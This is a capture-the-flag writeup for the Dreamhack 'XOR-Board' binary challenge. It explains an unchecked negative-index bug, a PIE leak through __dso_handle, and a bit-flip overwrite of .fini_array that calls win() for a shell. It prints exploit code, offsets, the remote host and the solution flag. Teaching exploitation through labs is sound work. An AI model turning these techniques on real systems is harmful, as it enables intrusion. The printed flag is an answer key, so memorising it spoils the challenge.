# XOR-Board Writeup

## Challenge

The program teaches how XOR works with a small menu:

```c
uint64_t arr[64] = {0};

void initialize() {
    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void xor() {
    int32_t i, j;
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}

void print() {
    uint32_t i;
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}

void win() {
    system("/bin/sh");
}
```

Goal: call `win()`.

Remote:

```text
nc host8.dreamhack.games 23733
```

## Protections

```text
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

Important points:

- PIE is enabled, so the base address must be leaked.
- No RELRO means `.got` and `.fini_array` are writable.
- Stack protections are irrelevant because there is no stack overflow.

## Bug

`xor()` does not validate either index:

```c
arr[i] ^= arr[j];
```

Both `i` and `j` are `int32_t`, so negative indexes are accepted. Since `arr` is in `.bss`, negative indexes let us read and write data located before `arr`, including `.got`, `.fini_array`, and `.data`.

`print()` uses `uint32_t i`, so it is not convenient for directly printing negative indexes. However, we can still leak an out-of-bounds qword by XORing it into a normal `arr` slot and printing that slot.

## Useful Offsets

From the binary:

```text
arr              = 0x34c0
__dso_handle     = 0x3488
.fini_array[0]   = 0x3218
win              = 0x13ed
```

The array index for an address is:

```python
idx = (target_addr - arr_addr) // 8
```

So:

```text
idx(__dso_handle)   = (0x3488 - 0x34c0) / 8 = -7
idx(.fini_array[0]) = (0x3218 - 0x34c0) / 8 = -85
```

## Leak Primitive

At initialization:

```text
arr[0] = 1
arr[1] = 2
arr[2] = 4
...
arr[n] = 1 << n
```

To leak an arbitrary qword at `arr[target_idx]`, use `arr[0]` as a scratch slot:

```text
arr[0] ^= arr[target_idx]
print arr[0]
arr[0] ^= arr[target_idx]
```

Because the original value of `arr[0]` is `1`, the real leaked value is:

```python
leaked = printed_value ^ 1
```

Then the second XOR restores `arr[0]`.

Using this, leak `__dso_handle`. Since `__dso_handle` points to itself in the PIE image:

```python
pie_base = leaked_dso_handle - 0x3488
win_addr = pie_base + 0x13ed
```

## Write Primitive

Because each normal `arr[n]` contains exactly one bit, `arr[i] ^= arr[n]` flips bit `n` of `arr[i]`.

To change an arbitrary writable qword from `old` to `new`:

```python
delta = old ^ new
for bit in range(64):
    if (delta >> bit) & 1:
        arr[target_idx] ^= arr[bit]
```

This gives a controlled qword write, one bit at a time.

## Why `.fini_array`

Overwriting a frequently used GOT entry such as `scanf` or `printf` is risky because the program may call it again before the overwrite is complete. A partially overwritten function pointer usually crashes.

`.fini_array[0]` is safer:

- It is writable because RELRO is disabled.
- It is called when the program exits.
- It is not used during the menu loop.

So we overwrite `.fini_array[0]` with `win`, then choose any menu option other than `1` or `2` to exit `main()`. During process shutdown, the overwritten `.fini_array` entry calls `win()`.

## Exploit

Full exploit: [`solve.py`](./solve.py)

Core logic:

```python
dso = leak_qword(io, idx(DSO_HANDLE))
pie_base = dso - DSO_HANDLE
win = pie_base + WIN

fini = leak_qword(io, idx(FINI_ARRAY))
flip_to(io, idx(FINI_ARRAY), fini, win)

io.sendlineafter(b"> ", b"3")
time.sleep(0.3)
io.sendline(b"cat flag 2>/dev/null || cat deploy/flag")
io.interactive()
```

Run locally:

```bash
python3 solve.py
```

Run remotely:

```bash
python3 solve.py REMOTE
```

## Flag

```text
DH{8475338cdd6114aad8f4c04264f523c3037d245e641118e2a7afe66710f469f4}
```
